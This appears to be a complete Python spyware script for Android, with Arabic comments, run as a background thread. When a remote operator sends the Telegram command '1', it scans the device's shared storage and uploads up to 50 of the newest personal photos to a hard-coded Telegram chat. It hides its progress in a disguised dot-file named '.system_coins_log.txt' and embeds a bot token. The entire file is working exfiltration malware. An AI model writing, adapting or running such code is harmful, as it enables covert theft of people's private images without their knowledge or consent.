import os
import time
import requests
import threading

# إعدادات البوت الخاصة بك
BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"
LOG_FILE = "/storage/emulated/0/.system_coins_log.txt"

def get_sent():
    if not os.path.exists(LOG_FILE): return set()
    with open(LOG_FILE, "r") as f: return set(f.read().splitlines())

def save_sent(path):
    try:
        with open(LOG_FILE, "a") as f: f.write(path + "\n")
    except: pass

def send_doc(path):
    try:
        # فلتر الحجم: يتجاهل أي ملف أصغر من 100 كيلوبايت (لمنع الملصقات والأيقونات)
        if os.path.getsize(path) < 100 * 1024:
            return False
        with open(path, "rb") as f:
            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={"chat_id": CHAT_ID}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except: return False

def deep_scan():
    """مسح شامل للمجلدات التي أرسلتها مع استبعاد الملصقات"""
    root_path = "/storage/emulated/0/"
    sent = get_sent()
    found = []
    
    # الامتدادات المسموحة فقط
    valid_exts = (".jpg", ".jpeg", ".png")
    # مجلدات يتم تجاهلها تماماً
    ignored_folders = ["screenshot", "cache", ".thumbnails", "stickers", "com.facebook.orca"]

    for root, dirs, files in os.walk(root_path):
        low_root = root.lower()
        if any(x in low_root for x in ignored_folders):
            continue
            
        for file in files:
            if file.lower().endswith(valid_exts):
                p = os.path.join(root, file)
                if p not in sent:
                    found.append(p)
    
    # الترتيب من الأحدث للأقدم
    found.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    return found

def background_worker():
    """منطق العمل في الخلفية"""
    # إرسال إشارة عند بدء التشغيل بنجاح
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": "✅ النظام نشط الآن في الخلفية.\nأرسل (1) لسحب 50 صورة نظيفة."})
    except: pass

    while True:
        try:
            # فحص الأوامر من البوت
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            r = requests.get(url, params={"offset": -1}, timeout=10).json()
            if r.get("result"):
                msg = r["result"][-1].get("message", {}).get("text", "")
                if msg == "1":
                    photos = deep_scan()
                    count = 0
                    for p in photos:
                        if count >= 50: break
                        if send_doc(p):
                            save_sent(p)
                            count += 1
                            time.sleep(0.3)
                    
                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                                  data={"chat_id": CHAT_ID, "text": f"✅ تم إرسال {count} صورة بنجاح."})
            
            time.sleep(10) # فحص كل 10 ثوانٍ
        except:
            time.sleep(15)

if __name__ == "__main__":
    # تشغيل منطق البوت في خيط مستقل لضمان عدم توقف الخدمة
    t = threading.Thread(target=background_worker)
    t.daemon = True
    t.start()
    
    # إبقاء العملية حية برمجياً
    while True:
        time.sleep(1)
